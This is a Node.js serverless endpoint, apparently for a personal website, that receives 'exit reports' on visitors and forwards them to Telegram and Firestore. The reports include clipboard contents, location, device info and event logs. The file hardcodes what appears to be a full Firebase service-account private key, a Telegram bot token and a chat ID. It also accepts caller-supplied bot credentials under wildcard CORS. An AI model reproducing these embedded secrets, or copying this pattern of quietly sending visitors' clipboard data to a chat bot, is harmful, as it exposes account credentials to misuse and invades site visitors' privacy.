const admin = require('firebase-admin');
const axios = require('axios');

// Initialize Firebase
if (!admin.apps.length) {
    admin.initializeApp({
        credential: admin.credential.cert({
            "project_id": "omeryigitler-5abfb",
            "private_key": process.env.FIREBASE_PRIVATE_KEY
                ? process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
                : "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCqBSNaafCJWDjO\nz60CQWqAxTmH7gIqSXaHlSBSUWaBELd4uznWI9DFcKILkxFsyd2aNpZPZWjS6opn\ng2E8lXnr2P0Ho5oRzzsRw5qwe/CmvNEcx4HiHZbnbhIQ6JiP3mX9Q3Ur3MW+TzA3\nhO5HBdyEe6E1LAhDwGFvXRBsi48F33sSLCDrSjPl+VerVi4kbhd1qp7Qfj2eGl6h\nIWYpgcpYtHS++3rHK/u8DZZ47DM6MD4djma8rJgaCcW9r75D3ksPsXfYJkTPw5e5\nUdF79pTMEVjSiCayNdSv4Xmh6psC/UtELR4YKsgtUTDU40qkZorfOWy0pIL9D1WS\nFYPpcpNLAgMBAAECggEABL8G+R+q+NKPJ2rRvBXiaLzYucwxoEeTuP43PEUMdP7n\n+EVVvH4cdl6KD4OoAV7zQjpS4N2GWxj0Cya2QLA1iplwmtV82BFuZzUMLPAQzD7K\nIaEKJatIyqYed/1eQOnm8/Z9n19W39SrFmmuEyp9OO+QlQDpLCcDMU4qRrVwpSvH\nxoycWFozjgjUVQbtogb+e7uTq3IgJFdK1aiNKV+bmgG5KVrv+vF3dPFxw7SWh+ST\nDVbXUF/ULOKF4JOTs6dunPVG209VRYJS6+jw8PPTIozDDTSY0ev0yBhRUFUwXGjd\naJOlv2gLzRU/kWO7zDz95ZrTLMT6kFILdSLXxVUCpQKBgQDYADF9uvRPBhKTEsgG\nM6oXgh5G/ESIY4e5lFMF0gFjLvqezzLhMeMLTM69MWX9nUA0imzTjv1EpeOSPVQd\nlF5KH19dZdihEYe0QjLDMb3VJe66SN0aXFW4/BCcQVnPI4+bzFAhnIDhdeQllusV\RgEj8YWKa9B+qeLkev4QoxbS1QKBgQDJgSsjOp0hgDTMCECLBDKunvPndoBuAnh0\nFPAf2FajPxbvUqEpugYRMMfzNxpuW12/2CGNsOsRllWHy2+rJdx1lbts/hDUQCUF\FePRFf2vtvDuKXI7xMzo1MFYbHWNlzGKmuhYVsBUrr5SToJKyCRQ8jglyXiqqJXE\n88mXxZWdnwKBgDPPmA94kLGD22C72I7kRaBt7aVJTYcJmLzC/0ceIIcR9buyJ5os\nxTEos05eUwCKf6QasA/u9IFK6VNispKFzDgrXkyg6V15PvvWBScc/1PpTWIRqDdy\fn1ouPNCGbC97uyIDZCCYcey5468rJblu9BLVqTlR5WaWnpDpj2HYSohAoGAerdX\ndhT0LLrPbJJ5/C+KTh4vm/7nKBgJE2jM9Bfka3a4mPdRfv/zQfTbUJt2VU7/QR53\nELt17TgIzrJuR2S/ZjzR8AaqaRjHctlp7KPf42seP2yuTQgFYqZvOVKUJK63VRoR\n9fqfFvN0pNt7Ld/FfiaFWz3fZs9UpqVxWCTUgTECgYB60AYRqgfHG7ATIUGb9oyB\nO2D+DgmT3dcgP+Cw4POvr+nWmRtuCswgHWkQcaG0vpclhYbcvcwrP84Rh35yBYmQ\n8fD6ZFxuxoT1mDgMy1ZgzaoMBHmSBor07rnct0DZ8LKHR7ixVG3fmMG4US3aStvy\n5H0sIhu0upGXfh67QPHmvw==\n-----END PRIVATE KEY-----\n",
            "client_email": "firebase-adminsdk-fbsvc@omeryigitler-5abfb.iam.gserviceaccount.com"
        })
    });
}

const db = admin.firestore();
const BOT_TOKEN_EXIT = "8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE"; // Secondary Bot Token
const CHAT_ID = "6886010817";

module.exports = async (req, res) => {
    // 1. Unified CORS Control
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Handle Preflight
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(200).send('OK');

    // --- FINAL FORTRESS PARSING (V42) ---
    let data = {};
    const rawBody = req.body;

    try {
        if (typeof rawBody === 'object' && !Buffer.isBuffer(rawBody)) {
            data = rawBody;
        } else {
            const bodyStr = Buffer.isBuffer(rawBody) ? rawBody.toString() : String(rawBody);
            if (bodyStr.trim().startsWith('{')) {
                data = JSON.parse(bodyStr);
            } else if (bodyStr.includes('=')) {
                bodyStr.split('&').forEach(pair => {
                    const [k, v] = pair.split('=');
                    data[decodeURIComponent(k)] = decodeURIComponent(v || '');
                });
            }
        }
    } catch (e) {
        console.error("V42 Parse Error:", e.message);
    }

    const {
        sessionID,
        duration,
        exitPage,
        location,
        deviceInfo,
        clipboard,
        eventLog,
        botToken,
        chatId
    } = data;

    if (!sessionID) {
        console.error("400: Missing Session ID");
        return res.status(400).send('Missing Session ID');
    }

    const finalBotToken = botToken || BOT_TOKEN_EXIT;
    const finalChatId = chatId || CHAT_ID;

    try {
        const brandingLink = `<a href="https://omeryigitler.com/assets/logo.png">&#x200b;</a>`;

        // 1. SUMMARY MESSAGE
        const summaryMsg = brandingLink +
            `🛑 <b>TAURUS EXIT REPORT [${sessionID}]</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `⏱ <b>DURATION:</b> <code>${duration}s</code>\n` +
            `📍 <b>EXIT PAGE:</b> <code>${exitPage}</code>\n` +
            `🌍 <b>LOCATION:</b> <code>${location || 'Unknown'}</code>\n` +
            `💻 <b>DEVICE:</b> <code>${deviceInfo || 'Unknown'}</code>\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━━`;

        // 2. PAYLOAD MESSAGE (SECOND MESSAGE)
        const payloadMsg = `📋 <b>CLIPBOARD ACTIVITY:</b>\n<pre>${clipboard || 'None'}</pre>\n\n` +
            `📝 <b>EVENT LOG (Last 20):</b>\n<pre>${eventLog || 'No events recorded'}</pre>`;

        // DELIVERY STACK
        let telegramSent = false;
        try {
            // Send Summary
            await axios.post(`https://api.telegram.org/bot${finalBotToken}/sendMessage`, {
                chat_id: finalChatId,
                text: summaryMsg,
                parse_mode: 'HTML',
                disable_web_page_preview: false
            });

            // Send Payload (The "Second Message")
            await axios.post(`https://api.telegram.org/bot${finalBotToken}/sendMessage`, {
                chat_id: finalChatId,
                text: payloadMsg.substring(0, 4090),
                parse_mode: 'HTML'
            });

            telegramSent = true;
        } catch (tgErr) {
            console.error("Telegram delivery failed:", tgErr.message);
        }

        // 3. Save to Firestore
        await db.collection('messages').add({
            name: "System Report",
            email: "tracker@taurus.sys",
            message: (summaryMsg + "\n" + payloadMsg).replace(/<[^>]*>/g, '').substring(0, 5000),
            timestamp: admin.firestore.FieldValue.serverTimestamp(),
            status: 'new',
            type: 'report',
            priority: 'high',
            sessionID: sessionID,
            telegram_notified: telegramSent
        });

        return res.status(200).json({ success: true, telegramSent });
    } catch (error) {
        console.error("Report API Error:", error);
        return res.status(500).json({ error: error.message });
    }
};
